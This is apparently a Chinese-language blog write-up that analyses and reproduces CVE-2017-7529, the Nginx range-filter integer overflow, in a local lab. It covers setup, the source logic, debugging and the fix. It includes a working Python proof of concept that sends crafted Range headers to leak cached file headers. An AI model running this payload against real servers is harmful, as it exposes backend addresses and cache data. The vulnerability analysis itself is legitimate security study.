---
layout:     post
title:      CVE-2017-7529-Nginx整型溢出漏洞调试分析
subtitle:   漏洞复现
date:       2020-08-20
author:     Jie_Y
header-img: img/post-bg-vulnerability.jpg
catalog: true
tags:
    - 漏洞逆向
    - 二进制
---

# CVE-2017-7529-Nginx整数溢出漏洞调试分析

概述：CVE-2017-7529是Nginx服务器对Range断点续传中的输入负数数据未进行校验导致整型溢出，由此可导致攻击者构造特殊的shellcode读取敏感字段和内容。本文对其原理进行分析并对漏洞进行复现。

## 1 漏洞描述

从0.5.6到1.13.2（含）的Nginx版本容易受到nginx范围过滤器模块中整数溢出漏洞的影响，从而导致特制请求触发的潜在敏感信息泄漏。当使用Nginx标准模块时，攻击者可以通过发送包含恶意构造range域的header请求，来获取响应中的缓存文件头部信息。在某些配置中，缓存文件头可能包含后端服务器的IP地址或其它敏感信息，从而导致信息泄露。

漏洞公开：<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7529>

影响范围：Nginx version 0.5.6 - 1.13.2

## 2 漏洞复现

### 2.1 调试环境

操作系统：VM Ubuntu 16.04.5 64位

![](media/06b23d3a20ca87d62d0909ecc67a6c26.png)

对象版本：Nginx 1.13.2

依赖： python3

### 2.2 复现结果

利用Docker直接进行复现，首先打开测试环境
```
$ docker-compose up -d
```
然后访问<http://127.0.0.1:8080/>

![](media/7061c308454ab948460c76d1a479aa97.png)

运行命令：
```
$ python3 poc.py http://127.0.0.1:8080/
```
![](media/6aa24bf3a8eba6dd19538f2fe004047f.png)

可见，越界读取到了位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。

## 3 漏洞分析

### 3.1 配置环境

首先下载Nginx，可以从官网(http://nginx.org/)下载也可以利用wget下载。

![](media/25b42e53a2964369d7d40517987a537b.png)

解压缩文件

![](media/55d61d12216f760f349ac44c8ebabce3.png)
```
cd nginx-1.13.2
./configure --prefix=/usr/local/nginx
make && make install
ln -s /usr/local/nginx/sbin/nginx /usr/bin //链接
systemctl stop firewalld
nginx
```
运行配置文件：

![](media/af08bb467f7123653959424eb2b78422.png)

编译：

![](media/63e3d901ebc05fb4ba193675021d74c5.png)

安装

![](media/422c997e5b629def5c9874b683044f9f.png)

![](media/e77a14db9eef2af1d74be4166ce5ec05.png)

安装成功！！

然后设置Nginx反向代理，编辑nginx的配置文件：
```
$ sudo vim /usr/local/nginx/conf/nginx.conf
```
设置Nginx服务器反向代理百度，开启缓存功能，具体配置如下：

![](media/a123493697903078c1000cd631b43c06.png)

proxy_cache_key用来指定生成的key的字段内容，用以区分缓存文件，这部分内容会在之后我们利用漏洞时被泄露。proxy_cache_path设置了缓存文件的路径和参数。proxy_cache_valid用来指定不同状态码下的缓存时间。server代码块设置了代理的内容，并对响应头进行了一些设置。add_header X-Proxy-Cache表示在响应头里添加一条X-Proxy-Cache，用以区分是否命中缓存，它一共有5种状态，MISS表示未命中，请求被传送到后端；HIT表示缓存命中；EXPIRED表示缓存已经过期请求被传送到后端；UPDATING表示正在更新缓存，将使用旧的应答；STALE表示后端将得到过期的应答。

配置文件修改后，让 Nginx 重新加载配置
```
$ sudo nginx -s reload
```
访问<http://127.0.0.1/img/bd_logo1.png>

![](media/ea8ce5bf2ea6ff77be3cfc1ae387d463.png)

正常访问，搭建成功！！

### 3.2 漏洞原理

#### HTTP断点续传：Range

HTTP的Range允许客户端分批次请求资源的一部分，如果服务端资源较大，可以通过Range来并发下载；如果访问资源时网络中断，可以<font color='red'>断点续传</font>。

Range设置在HTTP请求头中，它是多个byte-range-spec(或suffix-byte-range-spec)的集合；
```
byte-range-set = ( byte-range-spec | suffix-byte-range-spec )*N
byte-range-spec = first-byte-pos "-" [last-byte-pos]
suffix-byte-range-spec = "-" suffix-length
```
其中，first-bytes-pos指定了访问的第一个字节，last-byte-pos指定了最后一个字节，suffix-length则表示要访问资源的最后suffix-length个字节的内容；例如：

Range:bytes=0-1024表示访问第0到第1024字节；

Range:bytes=500-600,601-999，-300表示分三块访问，分别是500到600字节，601到600字节，最后的300字节；

在Response头中设置：

Accept-Ranges:bytes 表示接受部分资源的请求；

Content-Range：bytes START-END/SIZE
表示返回的资源位置；其中SIZE等于Content-Length；如：Content-Range: bytes
500-600/1000

#### Nginx Range Multipart

如果一次请求有多个range，返回的数据需要multipart来组织；格式如下：
```
HTTP/1.1 206 Partial Content
Date: Wed, 15 Nov 1995 06:25:24 GMT
Last-Modified: Wed, 15 Nov 1995 04:58:08 GMT
Content-type: multipart/byteranges; boundary=THIS_STRING_SEPARATES

--THIS_STRING_SEPARATES
Content-type: application/pdf
Content-range: bytes 500-999/8000

...the first range...
--THIS_STRING_SEPARATES
Content-type: application/pdf
Content-range: bytes 7000-7999/8000
...the second range
--THIS_STRING_SEPARATES--
```
Nginx对Range的支持包括header处理和body处理，分别用来解析客户端发送过来的Range header和裁剪返回给客户端的请求数据Body。其实现分别由ngx_http_range_header_filter_module和ngx_http_range_body_filter_module两个过滤模块完成。

在ngx_http_range_header_filter_module中调用了ngx_http_range_header_filter函数，而该函数进一步调用了ngx_http_range_parse函数来解析header中的Range字段；分别调用ngx_http_range_singlepart_header和ngx_http_range_multipart_header来生成single range和multi ranges的Response Header；

这次的问题就出现在多个range时，ngx_http_range_parse函数对suffix-length的处理。

#### Nginx Cache

Nginx可以作为缓存服务器，将Web应用服务器返回的内容缓存起来。如果客户端请求的内容已经被缓存，那么就可以直接将缓存内容返回，而无需再次请求应用服务器。由此，可降低应用服务器的负载，并提高服务的响应性能。

下面是使用Nginx作为缓存服务器的一个示例。假设Nginx监听本地80端口，反向代理百度，那么就有如下配置：

![](media/8e2a5e6ecafd0d607115c5ff4f2da04c.png)

此时，我们访问<http://127.0.0.1>，即可得到百度的返回：

![](media/5e09c2f895f01372a4768d0d217dfaf0.png)

检查页面资源，存在一个静态图片文件<http://www.baidu.com/img/bd_logo1.png>。由于这类静态文件一般不会发生变化，我们可以将其缓存起来。

Nginx配置缓存主要由以下命令完成：
```
proxy_cache_key用于区分cache文件。
proxy_cache_path设置cache文件的路径和参数。
	cache文件会保存在指定的目录下面，文件名是cache key的MD5值
	通过level参数将cache文件分多层目录保存，以避免某个目录下存在大量文件造成的性能开销。
	通过keys_zone参数指定cache key在内存中的区域及其大小，1M的区域大概可以保存8000条key的信息。
proxy_cache_valid对不同返回状态值设定cache有效时间
```
例如，下面这条配置：

![](media/5bf3196b02f0f89eec01b10b65614f18.png)

指定了以下信息：

使用协议、请求方法、域名、URI作为cache key

cache文件保存在目录/tmp/Nginx/下，采取两层目录，keys_zone名称为zone，大小为10M。

对于返回状态值为200的内容，cache有效时间为10分钟。

现在，我们配置好了名为zone的cache，接下来选择对目录<www.baidu.com>做缓存。首先，仍然是设置反向代理：接下来，我们使用下列命令对文件进行缓存：

![](media/f2107ccfb2796e18425ef77b94490f4c.png)

配置命令解释如下：
```
proxy_cache指定使用的keys_zone名称，就是之前的my_zone
add_header在Nginx返回的HTTP头中，增加一项X-Proxy-Cache，如果缓存命中其值为HIT，未命中则为MISS
proxy_ignore_headers由于百度对图片的请求也会Set-Cookie设置，而Nginx不会缓存带有Set-Cookie的返回，因此我们这里设置忽略该HTTP头
```
#### 源代码分析

漏洞存在于nginx-1.13.2/src/http/modules/ngx_http_range_filter_moudle.c文件，文件内的ngx_http_range_parse函数负责解析header中的Range字段内容。函数的部分内容如下：

![](media/a26ee5d7849d8d14af5dbadae4594c4a.png)

根据漏洞修复commit的注释，我们知道这次漏洞的主要成因就是bytes-range读取的起始范围可能为负数，从而读取缓存文件头部。if代码块对Range格式为start-end时的请求进行处理，其中cutoff和cutlim两个值保证了从Range字段取到的start值和end值始终为正数，这种情况下无法控制start为负值，所以我们需要使if条件为假，从而进入else语句，if的条件是指针p不为"-"，所以Range使用-end格式就可以进入else代码块。此时的suffix被赋值为1，程序向下执行：

![](media/58781da5222f15daa2429d044a00e733.png)

其中content_length并不是缓存文件的完整长度，而且服务器返回给我们的不包含缓存文件头的文件长度，我们这里称它为"正常文件长度"，之后会提到的完整的缓存文件长度我们称为"缓存文件长度"。

suffix为真时，Range的start等于正常文件长度content_length减去end的值，end值为正常文件长度content_length减去1。如果此时end值要比正常文件长度数值大的话，就可以将start解析为负值。与Range相关的还有一个size值，它是每段Range相加后的总长度：

![](media/47c54576e976be6cc548bec6ebbcb33c.png)

在满足start比end小的条件时，size就等于每段Range的长度之和。得到size的大小后会进行入下判断：

![](media/80b27b77e489efba4f814a8f91b4317c.png)

可以看到当size比正常文件长度大时，服务器便不再对缓存文件进行分段操作，而是直接返回原始的缓存文件。

知道了程序的逻辑关系，就可以想办法绕过了。首先，为了使服务器返回原始的缓存文件，我们需要让size值满足大于正常文件长度的条件，但是如果一个Range比缓存文件长度大，又会使得读取字节超出文件范围，造成读取失败。所以这里需要设置两个Range值，第一个值用来控制读取文件的字节数在缓存文件长度范围内，第二个值用来保证Range的总长度大于正常文件的总长度。这样就成功绕过过滤器的限制，读取到缓存文件的头部。

具体而言，检查用到的size是将multipart的全部range长度相加得到的：

因此，一个range是不够的，我们至少需要两个range，其长度之和溢出为负数，就可以绕过总长度的检查了。

要得到一个很大长度的range，同样可以采用-end这种后缀型，将end设置为一个非常大的数即可。此处的start,end,size均为64位有符号整形，所以只需要最终相加得到的size为0×8000000000000000即可。

### 3.3 动态调试

使用curl命令进行实验，访问<http://127.0.0.1/img/bd_logo1.png>，由于第一次访问，其中返回内容中X-Proxy-Cache的值为MISS：

![](media/cc6d6341ff05ae905cd42dcdcca713bd.png)

再次访问时，此时缓存已被命中，X-Proxy-Cache的值已为HIT。

![](media/4c2b504f077b930302dc9ccf7e36db57.png)

此时访问缓存目录，发现存在Cache文件：

![](media/1898d87a893aba8c472c73f23238e98f.png)

可见，确实使用了2层目录保存了Cache文件，Cache文件保存了Nginx请求得到的返回内容：

![](media/71694fd4081da3cf3730048045bd65d1.png)

可以看到，cache key的内容保存在了Cache文件的头部，此外还有Nginx请求后端返回的HTTP头，如后端（这里是<www.baidu.com>）的服务器为Apache。正常情况下，这些信息是不会返回给客户端的。而本次的漏洞，就是由于负数偏移量，导致Cache文件的头部信息也被返回，从而造成信息泄漏。

首先利用curl命令得到图片文件的长度为7877：

![](media/18bba0e9f1d66e917bfa8da532b8d47b.png)

假设我们想要额外读取缓存文件头部600字节，第一段Range就需要设置为-7877-600，也就是-8477。第二段Range既然要足够大，那我们就用Range可设置的最大值减去第一段Range大小，这样两段Range相加得到的size依然是最大值，也就必然超过了正常文件长度。Range可接受的数值为64位整型，最大为0x8000000000000000，换成10进制是9223372036854776000，减去8477等于9223372036854767523，也就是第二段Range长度。

设置Range参数后再次请求缓存文件：

![](media/4e4f42773428d0f3211ae6dc8cc28672.png)

可以看到成功读取了缓存文件头部。

POC：
```
#!/usr/bin/env python
# -*- coding:utf-8 -*-

import sys
import requests

if len(sys.argv) < 2:
print("%s url" % (sys.argv[0]))
print("eg: python %s http://your-ip:80/" % (sys.argv[0]))
sys.exit()
headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"}
offset = 605
url = sys.argv[1]
print("url:",url)
file_len = len(requests.get(url, headers=headers).content)
print("file_len: ",file_len)
n = file_len + offset
headers['Range'] = "bytes=-%d,-%d" % (n, 0x8000000000000000 - n)
print("headers:",headers)
r = requests.get(url, headers=headers)
print("r:",r)
print(r.text)
```
运行：

![](media/018b14ad5ee44e75ce4884c22dcbf814.png)

同样获得KEY！

## 4 漏洞修复

![](media/75ee369f29a5723fb5ee78b396a2fc83.png)

可以看到，在ngx_http_range_filter_module.c的ngx_http_range_parse函数中做了两处修复：

[if !supportLists]· [endif]进一步检测了size的溢出情况，防止size溢出后造成小于content-length这条判断的绕过；

[if !supportLists]· [endif]则直接限定了使用后缀的情况下，start不能为负的，最小只能是0，也就是说使用“-xxx”的方式对Cache文件的读取只能从0开始到结束。

## 5 总结

Nginx整型溢出漏洞利用了Nginx服务器方向代理时未对Range的start的值进行校验，导致其为负数绕过对缓存文件长度的判断，直接得到缓存结果。在进行漏洞复现时，现有资料大都直接利用docker直接获取搭建好的环境。在自己尝试搭建环境时，由于原理没有理解清楚导致复现过程一直失败。想要完全掌握一个漏洞就要找到漏洞的关键成因是什么，掌握了成因复现漏洞才会事半功倍。

## 6 参考

1、https://www.freebuf.com/articles/terminal/140402.html

2、<https://blog.csdn.net/jiangbuliu/article/details/95943112>

3、<https://www.shungg.cn/post/173>

4、<https://paper.seebug.org/353/>

5、<https://blog.jenisec.org/security/nginx-int-overflow.html>
